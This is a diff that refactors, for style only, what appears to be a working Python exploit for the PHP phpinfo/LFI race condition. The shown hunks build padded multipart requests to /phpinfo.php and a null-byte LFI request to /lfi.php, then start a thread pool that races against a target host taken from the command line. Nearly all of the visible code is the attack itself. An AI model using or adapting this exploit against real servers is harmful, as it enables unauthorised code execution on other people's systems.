@@ -19,17 +19,32 @@ Content-Type: text/plain\r
 %s
 -----------------------------7dbff1ded0714--\r""" % PAYLOAD
     padding="A" * 5000
-    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
-Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
-HTTP_ACCEPT: """ + padding + """\r
-HTTP_USER_AGENT: """+padding+"""\r
-HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
-HTTP_PRAGMA: """+padding+"""\r
+    REQ1 = (
+        f"""POST /phpinfo.php?a={padding}"""
+        + """ HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""
+        + padding
+        + """\r
+HTTP_ACCEPT: """
+        + padding
+        + """\r
+HTTP_USER_AGENT: """
+        + padding
+        + """\r
+HTTP_ACCEPT_LANGUAGE: """
+        + padding
+        + """\r
+HTTP_PRAGMA: """
+        + padding
+        + """\r
 Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
 Content-Length: %s\r
 Host: %s\r
 \r
-%s""" %(len(REQ1_DATA),host,REQ1_DATA)
+%s"""
+        % (len(REQ1_DATA), host, REQ1_DATA)
+    )
+
     #modify this to suit the LFI script
     LFIREQ="""GET /lfi.php?load=%s%%00 HTTP/1.1\r
 User-Agent: Mozilla/4.0\r
@@ -124,13 +139,13 @@ def main():
     print("-=" * 30)
 
     if len(sys.argv) < 2:
-        print("Usage: %s host [port] [threads]" % sys.argv[0])
+        print(f"Usage: {sys.argv[0]} host [port] [threads]")
         sys.exit(1)
 
     try:
         host = socket.gethostbyname(sys.argv[1])
     except socket.error as e:
-        print("Error with hostname %s: %s" % (sys.argv[1], e))
+        print(f"Error with hostname {sys.argv[1]}: {e}")
         sys.exit(1)
 
     port=80
@@ -163,16 +178,17 @@ def main():
     print("Spawning worker pool (%d)..." % poolsz)
     sys.stdout.flush()
 
-    tp = []
-    for i in range(0,poolsz):
-        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+    tp = [
+        ThreadWorker(
+            e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag
+        )
+        for _ in range(poolsz)
+    ]
 
     for t in tp:
         t.start()
     try:
-        while not e.wait(1):
-            if e.is_set():
-                break
+        while not e.wait(1) and not e.is_set():
             with l:
                 sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                 sys.stdout.flush()
